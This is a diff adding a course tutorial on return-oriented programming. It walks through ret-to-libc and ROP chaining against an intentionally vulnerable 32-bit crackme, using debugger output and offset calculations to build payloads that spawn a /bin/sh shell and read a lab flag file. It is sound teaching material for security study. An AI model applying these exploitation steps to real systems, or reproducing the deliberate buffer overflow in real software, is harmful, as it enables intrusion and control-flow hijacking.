@@ -1,0 +1,409 @@
+# Tut06: Return-oriented Programming (ROP)
+
+In Lab05, we learned that
+even when DEP and ASLR are applied,
+there are application-specific contexts
+that can lead to full control-flow hijacking.
+In this tutorial, 
+we are going to learn a more generic technique,
+called return-oriented programming (ROP),
+which can perform reasonably generic computation
+without injecting our shellcode.
+
+## Step 1. Ret-to-libc
+
+To make our tutorial easier, 
+we assume code pointers are already leaked
+(i.e., `system()` and `printf()` in the libc library).
+
+```c
+void start() {
+  printf("IOLI Crackme Level 0x00\n");
+  printf("Password:");
+
+  char buf[32];
+  memset(buf, 0, sizeof(buf));
+  read(0, buf, 256);
+
+  if (!strcmp(buf, "250382"))
+    printf("Password OK :)\n");
+  else
+    printf("Invalid Password!\n");
+}
+
+int main(int argc, char *argv[])
+{
+  void *self = dlopen(NULL, RTLD_NOW);
+  printf("stack   : %p\n", &argc);
+  printf("system(): %p\n", dlsym(self, "system"));
+  printf("printf(): %p\n", dlsym(self, "printf"));
+
+  start();
+
+  return 0;
+}
+```
+
+```shell
+  $ checksec ./target
+   [*] '/home/lab06/tut06-rop/target'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+Please note that NX is enabled, so you cannot place your shellcode
+neither in stack nor heap, but the stack protector is disabled,
+allowing us to initiate a control hijacking attack. Previously, 
+by jumping into the injected shellcode, we could compute anything 
+(e.g., launching a shell) we wanted, but under DEP, we can not 
+easily achieve what we want as an attacker. However, it turns out
+DEP is not powerful enough to completely prevent this problem. 
+
+Let's make a first step, what we called _ret-to-libc_.
+
+```shell
+  $ ./target
+  stack   : 0xffdcba40
+  system(): 0xf7d3e200
+  printf(): 0xf7d522d0
+  IOLI Crackme Level 0x00
+  Password:
+```
+
+> **[Task]** Your first task is to trigger a buffer overflow and print out
+> "Password OK :)"!
+
+Your payload should look like this:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> printf()
+  [dummy]
+  [arg1 ] -> "Password OK :)"
+```
+
+When printf() is invoked, "Password OK :)" will be considered as its
+first argument. As this exploit returns to a libc function, this
+technique is often called "ret-to-libc".
+
+
+
+## Step 2. Understanding the process's image layout
+
+Let's get a shell out of this vulnerability. To get a shell, we are
+going to simply invoke the `system()` function 
+(check ["man system"](http://man7.org/linux/man-pages/man3/system.3.html)
+if you are not familiar with).
+
+Like the above payload, you can easily place the pointer to `system()`
+by replacing `printf()` with `system()`.
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> system()
+  [dummy]
+  [arg1 ] -> "/bin/sh"
+```
+
+But what's the pointer to `/bin/sh`? In fact, a typical process memory
+(and libc) contain lots of such strings (e.g., various shells). Think
+about how the `system()` function is implemented; it essentially
+invoke system calls like `fork()/execve()`
+on `/bin/sh` with the provided arguments
+(check[glibc](https://github.com/bminor/glibc/blob/master/sysdeps/posix/system.c#L189)].
+
+`gdb-pwndbg` provides a pretty easy interface to search a string in the memory:
+
+```shell
+  $ gdb-pwndbg ./target
+  > r
+  Starting program: /home/lab06/tut06-rop/target
+  stack   : 0xffffd650
+  system(): 0xf7e1d200
+  printf(): 0xf7e312d0
+  IOLI Crackme Level 0x00
+  Password:
+  ...
+  > search  "/bin"
+  libc-2.27.so    0xf7f5e0cf das     /* '/bin/sh' */
+  libc-2.27.so    0xf7f5f5b9 das     /* '/bin:/usr/bin' */
+  libc-2.27.so    0xf7f5f5c2 das     /* '/bin' */
+  libc-2.27.so    0xf7f5fac7 das     /* '/bin/csh' */
+  ...
+```
+
+There are bunch of strings you can pick up for feeding the system()
+function as an argument. Note that all pointers should be different
+across each execution thanks to ASLR on stack/heap and libraries.
+
+Our goal is to invoke `system("/bin/sh")`, like this:
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> system (provided: 0xf7e1d200)
+  [dummy]
+  [arg1 ] -> "/bin/sh" (searched: 0xf7f5e0cf)
+```
+
+Unfortunately though, these numbers keep changing. How to infer the
+address of `/bin/sh` required for `system()`? As you've learned from the
+'libbase' challenge in Lab05, ASLR does not randomize the offset
+inside a module; it just randomizes only the _base address_
+of the entire module (why though?)
+
+```
+  0xf7f5e0cf (/bin/sh) - 0xf7e1d200 (system) = 0x140ecf
+```
+
+So in your exploit, by using the address of `system()`, you can calculate
+the address of `/bin/sh` (0xf7f5e0cf = 0xf7e1d200 + 0x140ecf).
+
+Try?
+
+By the way, where is this magic address (0xf7e1d200, the address of
+`system()`) coming from? In fact, you can also compute by hand. Try
+`vmmap` in `gdb-pwndbg`:
+
+```shell
+  > vmmap
+  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+  0x8048000  0x8049000 r-xp     1000 0      /home/lab06/tut06-rop/target
+  0x8049000  0x804a000 r--p     1000 0      /home/lab06/tut06-rop/target
+  0x804a000  0x804b000 rw-p     1000 1000   /home/lab06/tut06-rop/target
+ 0xf7de0000 0xf7fb5000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
+ 0xf7fb5000 0xf7fb6000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
+ 0xf7fb6000 0xf7fb8000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
+ 0xf7fb8000 0xf7fb9000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
+  ...
+```
+
+The base address (a mapped region) of libc is '0xf7de0000'; "x" in
+the "r-xp" permission is telling you that's an eXecutable region
+(i.e., code).
+
+Then, where is `system()` in the library itself? As these functions are
+exported for external uses, you can parse the elf format like below:
+
+```shell
+   $ readelf -s /lib/i386-linux-gnu/libc-2.27.so | grep system
+   254: 00129640   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
+   652: 0003d200    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+```
+
+0x0003d200 is the beginning of the `system()` function inside the libc
+library, so its base address plus 0x0003d200 should be the address we
+observed previously.
+
+```
+  0xf7de0000 (base) + 0x0003d200 (offset) = 0xf7e1d200 (system)
+```
+
+> **[Task]** Then, can you calculate the base of the library from the leaked
+> `system()`'s address? and what's the offset of `/bin/sh` in the libc
+> module? Have you successfully invoked the shell? 
+
+
+## Step 3. Your first ROP
+
+Generating a segfault after exploitation is a bit unfortunate, so
+let's make it gracefully terminate after the exploitation. Our plan
+is to _chain_ two library calls. This is a first step toward generic 
+computation. Let's first chain `exit()` after `system()`.
+
+```c
+   system("/bin/sh")
+   exit(0)
+```
+
+Let's think about what happen when `system("/bin/sh")` returns; that is,
+when you exited the shell (type 'exit' or C-c).
+
+```c
+  [buf  ]
+  [.....]
+  [ra   ] -> system
+  [dummy]
+  [arg1 ] -> "/bin/sh"
+```
+
+Did you notice that the 'dummy' value is the last ip of the program
+crashed? In other words, similar to stack overflows, you can keep
+controlling the next return addresses by chaining them. What if we
+inject the address to exit() on 'dummy'?
+
+```c
+  [buf      ]
+  [.....    ]
+  [old-ra   ] -> 1) system
+  [ra       ] -------------------> 2) exit
+  [old-arg1 ] -> 1) "/bin/sh"
+  [arg1     ] -> 0
+```
+
+When `system()` returns, `exit()` will be invoked; perhaps you can even
+control its argument like above (arg1 = 0).
+
+> **[Task]** Try? You should be able to find the address of `exit()` 
+> like previous example.
+
+Unfortunately, this chaining scheme will stop after the second
+calls. In this week, you will be learning more generic, powerful
+techniques to keep maintaining your payloads, so called
+return-oriented programming (ROP).
+
+Think about:
+
+```c
+  [buf      ]
+  [.....    ]
+  [old-ra   ] -> 1) func1
+  [ra       ] -------------------> 2) func2
+  [old-arg1 ] -> 1) arg1
+  [arg1     ] -> arg1
+  
+  1) func1(arg1)
+  2) func2(arg1)
+  3) crash @func1's arg1 (old-arg1) 
+```
+
+After func2(arg1), 'old-arg1' will be our next return address in this
+payload. Here comes a nit trick, a pop/ret gadget.
+
+```c
+  [buf      ]
+  [.....    ]
+  [old-ra   ] -> 1) func1
+  [ra       ] ------------------> pop/ret gadget
+  [old-arg1 ] -> 1) arg1
+  [dummy    ]
+
+  * crash at dummy!
+```
+
+In this case, after func1(arg1), it returns to 'pop/ret' instructions,
+which 1) pop 'old-arg1' (not the stack pointer points to 'dummy')
+and 2) returns again (i.e., crashing at dummy).
+
+```c  
+  [buf      ]
+  [.....    ]
+  [old-ra   ] -> 1) func1
+  [ra       ] ------------------> pop/ret gadget
+  [old-arg1 ] -> 1) arg1
+  [ra       ] -> func2
+  [dummy    ]
+  [arg1     ] -> arg1
+```
+
+In fact, it goes back to the very first state we hijacked 
+the control-flow by smashing the stack. So, in order to chain 
+func2, we can hijack its control-flow again to func2.
+
+Although 'pop/ret' gadgets are everywhere (check any function!), there
+is a useful tool to search all interesting gadgets for you.
+
+```shell
+  $ ropper -f ./target
+  ....
+  0x08048479: pop ebx; ret; 
+  ....
+```
+
+> **[Task]** Can you chain system("/bin/sh") and exit(0) 
+> by using the pop/ret gadget? like below?
+
+```c
+  [buf      ]
+  [.....    ]
+  [old-ra   ] -> 1) system
+  [ra       ] -----------------> pop/ret
+  [old-arg1 ] -> 1) "/bin/sh"
+  [ra       ] -> 2) exit
+  [dummy    ]
+  [arg1     ] -> 0
+```
+
+## Step 4. ROP-ing with Multiple Chains
+
+By using this 'gadget', we can keep chaining multiple functions
+together like this:
+
+```c
+  [buf      ]
+  [.....    ]
+  [old-ra   ] -> 1) func1
+  [ra       ] ------------------> pop/ret gadget
+  [old-arg1 ] -> 1) arg1
+  [ra       ] -> func2
+  [ra       ] ------------------> pop/pop/ret gadget
+  [arg1     ] -> arg1
+  [arg2     ] -> arg2
+  [ra       ] ...
+
+  1) func1(arg1)
+  2) func2(arg1, arg2)
+```
+
+You know what? All gadgets are ended with "ret" so called
+"return"-oriented programming.
+
+> **[Task]** It's time to chain three functions! Can you invoke
+> three functions listed below in sequence?
+
+```c
+  printf("Password OK :)")
+  system("/bin/sh")
+  exit(0)
+```
+
+Finally, your job today is to chain a ROP payload:
+
+```c
+  open("/proc/flag", O_RDONLY)
+  read(3, tmp, 1024)
+  write(1, tmp, 1024)
+```
+
+More specifically, prepare the payload:
+
+```c
+  [buf      ]
+  [.....    ]
+  [ra       ] -> 1) open
+  [pop2     ] --------------------> pop/pop/ret
+  [arg1     ] -> "/proc/flag"
+  [arg2     ] -> 0 (O_RDONLY)
+  [ra       ] -> 2) read
+  [pop3     ] ------------------> pop/pop/pop/ret
+  [arg1     ] -> 3 (new fd)
+  [arg2     ] -> tmp
+  [arg3     ] -> 1024
+  [ra       ] -> 3) write
+  [dummy    ]
+  [arg1     ] -> 1 (stdout)
+  [arg2     ] -> tmp
+  [arg3     ] -> 1024
+```
+
+1) tmp? Any writable place in the program? (i.e., check `vmmap`)
+2) `/proc/flag`? Any place you can inject such a string in the stack
+   as part of your buffer input (i.e., use stack)? Note that `/proc/flag` 
+   is not code injection, but data.
+
+> **[Task]** Exploit `target-seccomp` with your payload
+> and submit the flag!
+
+
+## Reference
+
+- [Return-oriented Programming: Exploitation without Code Injection](https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf)
+- [Dive into ROP](http://blog.exploitlab.net/2013/06/dive-into-rop-blackhat-usa-2013.html)
+- [Retrun-oriented Programming: Systems, Languages, and Applications](https://cseweb.ucsd.edu/~hovav/dist/rop.pdf)
+
